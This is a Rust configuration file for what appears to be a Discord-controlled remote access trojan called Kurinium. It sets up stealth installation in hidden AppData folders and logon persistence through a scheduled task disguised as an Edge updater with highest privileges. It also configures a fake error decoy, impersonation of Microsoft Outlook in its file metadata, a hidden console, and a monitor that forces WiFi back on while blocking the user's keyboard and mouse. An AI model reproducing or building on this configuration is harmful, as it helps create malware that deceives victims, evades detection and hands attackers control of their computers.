use std::collections::HashSet;
use twilight_model::id::{marker::GuildMarker, Id};

// struct holds all settings for the keep active feature
pub struct KeepActiveConfig {
    pub enabled: bool,
    pub interval_seconds: u64,
}

// struct holds all settings for the WiFi monitor
pub struct WifiMonitorConfig {
    pub enabled: bool,
    pub check_interval_ms: u64, // How often to check WiFi state (milliseconds)
    pub re_enable_delay_seconds: u64, // How long to wait before re-enabling WiFi
    pub block_user_input: bool, // Block keyboard/mouse during re-enable
}

// struct holds all settings for the scheduled task
pub struct StartupConfig {
    pub enabled: bool,
    pub task_name: &'static str,
    pub on_logon: bool, // Run when any user logs on
    pub highest_privileges: bool, // Run with highest privileges
}

#[allow(dead_code)] // ignore unused warning
pub enum MessageBoxIcon {
    Error,
    Warning,
    Info,
    Question,
}

#[allow(dead_code)]// ignore unused warning
pub enum MessageBoxButtons {
    Ok,
    OkCancel,
    YesNo,
}

// struct holds all settings for the fake error
pub struct DecoyConfig {
    pub enabled: bool,
    pub title: &'static str,
    pub message: &'static str,
    pub icon: MessageBoxIcon,
    pub buttons: MessageBoxButtons,
}

#[allow(dead_code)]// ignore unused warning
pub struct BuildInfo {
    pub file_name: &'static str,
    pub product_name: &'static str,
    pub description: &'static str,
    pub company_name: &'static str,
    pub file_version: &'static str,
}

pub struct Config;

impl Config {
    // --- Kurinium configuration ---
    pub const DISCORD_TOKEN: &'static str = "kurinium-bot=token";
    pub const GUILD_ID: u64 = 10000000000; // replace with your own guild ID
    pub const BOT_PREFIX: &'static str = ".";

    /*
    --- Installation Configuration ---
    1. %LOCALAPPDATA%\Packages
    2. %LOCALAPPDATA%\Microsoft\WindowsApps
    3. %LOCALAPPDATA%\Microsoft\Edge\User Data\Autofill\4.0.1.27\
    4. %APPDATA%\Microsoft\Windows\Themes
    5. %APPDATA%\Microsoft\Templates
    6. %LOCALAPPDATA%\Microsoft\Windows\INetCache
    7. %LOCALAPPDATA%\Microsoft\Windows\WebCache
    */
    pub const INSTALLATION_PATH: u8 = 1; // 1-7 for different installation paths

    pub fn get_startup_config() -> StartupConfig {
        StartupConfig {
            enabled: true,
            task_name: "Microsoft Edge Update Core",
            on_logon: true,
            highest_privileges: true,
        }
    }

    pub fn get_decoy_config() -> DecoyConfig {
        DecoyConfig {
            // set to false to disable the fake error
            enabled: false,
            title: "Microsoft Visual C++ Runtime Library", // the title of the error window
            // the main error text. use \n for new lines.
            message: "Runtime Error!\n\nProgram: C:\\Windows\\System32\\svchost.exe\n\nR6025\n- pure virtual function call",
            icon: MessageBoxIcon::Error, // icon type: Error, Warning, Info, Question
            buttons: MessageBoxButtons::Ok, // button layout: Ok, OkCancel, YesNo
        }
    }

    // --- Authentication Configuration ---
    pub fn get_auth_config() -> AuthConfig {
        AuthConfig {
            auth_roles: false, // false = disable
            allowed_roles: HashSet::from([
                // Add your role IDs here
                // "ROLE_ID_1".to_string(),
                // "ROLE_ID_2".to_string(),
            ]),
            auth_user: false, // false = disable
            allowed_users: HashSet::from([
                // Add your user IDs here
                // "USER_ID_1".to_string(),
                // "USER_ID_2".to_string(),
            ]),
            auth_all: true, // true = allow everyone
        }
    }

    pub fn get_keep_active_config() -> KeepActiveConfig {
        KeepActiveConfig {
            enabled: true,
            interval_seconds: 60,
        }
    }

    // Wifi monitor config
    pub fn get_wifi_monitor_config() -> WifiMonitorConfig {
        WifiMonitorConfig {
            enabled: true, // false = disabled
            check_interval_ms: 500, // check every 500ms (0.5 seconds)
            re_enable_delay_seconds: 3, // wait 3 secs before trying to re-enable
            block_user_input: true, // block keyboard/mouse during re-enable
        }
    }

    // new build info config for legit look
    pub fn get_build_info() -> BuildInfo {
        BuildInfo {
            file_name: "Microsoft.Outlook.exe",
            product_name: "Microsoft Outlook",
            description: "Microsoft Outlook", // this will show in Task manager
            company_name: "Microsoft Corporation",
            file_version: "10.0.19041.3303",
        }
    }
    
    // --- Helper methods ---
    pub fn get_guildid() -> Id<GuildMarker> {
        Id::new(Self::GUILD_ID)
    }

    pub fn get_token() -> String {
        Self::DISCORD_TOKEN.to_string()
    }

    pub fn get_exe_name() -> &'static str {
        Self::get_build_info().file_name
    }

    pub fn get_max_bfilesize() -> usize {
        (Self::MAX_FILE_SIZE_MB * 1024.0 * 1024.0) as usize
    }
    pub const MAX_FILE_SIZE_MB: f64 = 10.0; // Discord file limit | Free = 10mb | Classic = 50mb | Nitro = 500mb
}

// Authentication configuration structure
#[derive(Debug, Clone)]
pub struct AuthConfig {
    pub auth_roles: bool,
    pub allowed_roles: HashSet<String>,
    pub auth_user: bool,
    pub allowed_users: HashSet<String>,
    pub auth_all: bool,
}

impl Default for AuthConfig {
    fn default() -> Self {
        Self {
            auth_roles: false,
            allowed_roles: HashSet::new(),
            auth_user: false,
            allowed_users: HashSet::new(),
            auth_all: true, // Default to allowing everyone
        }
    }
}

#[cfg(debug_assertions)]
impl Config {
    pub const SHOW_CONSOLE: bool = true; // Set to false to hide console completely
}

#[cfg(not(debug_assertions))]
impl Config {
    pub const SHOW_CONSOLE: bool = false; // Hide console in release builds
}
